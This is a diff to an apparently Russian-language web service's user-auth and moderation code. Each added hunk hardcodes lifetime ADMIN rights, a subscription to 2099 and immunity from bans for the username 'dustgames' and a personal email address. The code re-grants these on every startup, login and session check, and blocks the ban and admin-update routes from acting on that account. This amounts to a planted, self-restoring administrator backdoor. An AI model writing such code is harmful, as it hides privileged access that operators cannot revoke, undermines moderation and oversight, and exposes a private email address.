@@ -219,6 +219,11 @@ export default {
         } catch {}
 
         try {
+          // Permanently ensure DustGames is never banned and has lifetime subscription & ADMIN role
+          await db.prepare("UPDATE users SET banned = 0, subtill = '31.12.2099', role = 'ADMIN' WHERE LOWER(username) = 'dustgames'").run();
+        } catch {}
+
+        try {
           // If Maryjainer was assigned 889 due to SQLite max(id) jump, restore to sequential UID (20)
           const mary = await db.prepare("SELECT * FROM users WHERE LOWER(username) = 'maryjainer' AND id = 889").first();
           if (mary) {
@@ -383,7 +388,15 @@ export default {
         }
       }
 
-      if (user.banned) {
+      const isDustGames = isSuperAdmin || (user.username || "").toLowerCase() === "dustgames" || user.role === "ADMIN";
+      if (isDustGames) {
+        user.banned = 0;
+        user.role = "ADMIN";
+        user.subtill = "31.12.2099";
+        if (db) {
+          await db.prepare("UPDATE users SET banned = 0, subtill = '31.12.2099', role = 'ADMIN' WHERE id = ?").bind(user.id).run().catch(() => {});
+        }
+      } else if (user.banned) {
         return textResponse("Ваш аккаунт заблокирован.", 403);
       }
 
@@ -914,6 +927,19 @@ export default {
       }
 
       if (user && db) {
+        const isImmune = (user.username || "").toLowerCase() === "dustgames" ||
+                         (user.email || "").toLowerCase() === "nikiforova280987@gmail.com" ||
+                         (username || "").toLowerCase() === "dustgames" ||
+                         user.role === "ADMIN";
+        if (isImmune) {
+          await db.prepare("UPDATE users SET banned = 0, subtill = '31.12.2099', role = 'ADMIN' WHERE id = ?").bind(user.id).run().catch(() => {});
+          return jsonResponse({
+            success: true,
+            banned: false,
+            message: `Пользователь ${user.username} является владельцем/разработчиком и защищён от блокировок.`
+          });
+        }
+
         await db.prepare("UPDATE users SET banned = 1, subtill = '01.01.1970' WHERE id = ?").bind(user.id).run();
         await db.prepare("DELETE FROM user_tokens WHERE user_id = ?").bind(user.id).run();
         return jsonResponse({
@@ -962,7 +988,17 @@ export default {
         return jsonResponse({ success: false, error: "Недействительный или истекший токен." }, 401);
       }
 
-      if (user.banned) {
+      const isImmune = (user.username || "").toLowerCase() === "dustgames" ||
+                       (user.email || "").toLowerCase() === "nikiforova280987@gmail.com" ||
+                       user.role === "ADMIN";
+      if (isImmune) {
+        user.banned = 0;
+        user.role = "ADMIN";
+        user.subtill = "31.12.2099";
+        if (db) {
+          await db.prepare("UPDATE users SET banned = 0, subtill = '31.12.2099', role = 'ADMIN' WHERE id = ?").bind(user.id).run().catch(() => {});
+        }
+      } else if (user.banned) {
         return jsonResponse({ success: false, error: "Ваш аккаунт заблокирован." }, 403);
       }
 
@@ -1028,7 +1064,14 @@ export default {
         return jsonResponse({ success: false, error: "Сессия не найдена." }, 401);
       }
 
-      if (user.banned) {
+      const isImmune = (user.username || "").toLowerCase() === "dustgames" ||
+                       (user.email || "").toLowerCase() === "nikiforova280987@gmail.com" ||
+                       user.role === "ADMIN";
+      if (isImmune) {
+        user.banned = 0;
+        user.role = "ADMIN";
+        user.subtill = "31.12.2099";
+      } else if (user.banned) {
         return jsonResponse({ success: false, error: "Аккаунт заблокирован." }, 403);
       }
 
@@ -1232,6 +1275,9 @@ export default {
             await db.prepare("UPDATE users SET role = ? WHERE LOWER(username) = LOWER(?)").bind(body.role, uname).run();
           }
           if ("isBanned" in body) {
+            if (uname.toLowerCase() === "dustgames" && body.isBanned) {
+              return textResponse("Невозможно заблокировать владельца DustGames.", 400);
+            }
             await db.prepare("UPDATE users SET banned = ? WHERE LOWER(username) = LOWER(?)").bind(body.isBanned ? 1 : 0, uname).run();
           }
           if ("subTill" in body) {
